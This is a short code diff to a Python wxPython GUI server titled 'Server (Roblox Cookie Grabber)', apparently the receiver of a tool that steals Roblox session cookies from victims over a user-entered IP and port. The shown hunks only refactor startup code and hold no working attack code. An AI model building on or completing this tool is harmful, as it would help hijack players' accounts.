@@ -38,11 +38,8 @@ class Frame(GUIserver):
 
         # self.tbIP.SetValue(ip_address)
 
-        self.InitUI()
         self.Show()
         self.Centre()
-
-    def InitUI(self): ...
 
     def onTextEnter(self, event):
         self.ADDR = (str(self.tbIP.GetValue()), int(self.tbPORT.GetValue()))
@@ -131,8 +128,5 @@ class Frame(GUIserver):
 
 if __name__ == '__main__':
     app = wx.App()
-    Frame(None,  'Server (Roblox Cookie Grabber)')
+    frame = Frame(None,  'Server (Roblox Cookie Grabber)')
     app.MainLoop()
-
-while True:
-    pass
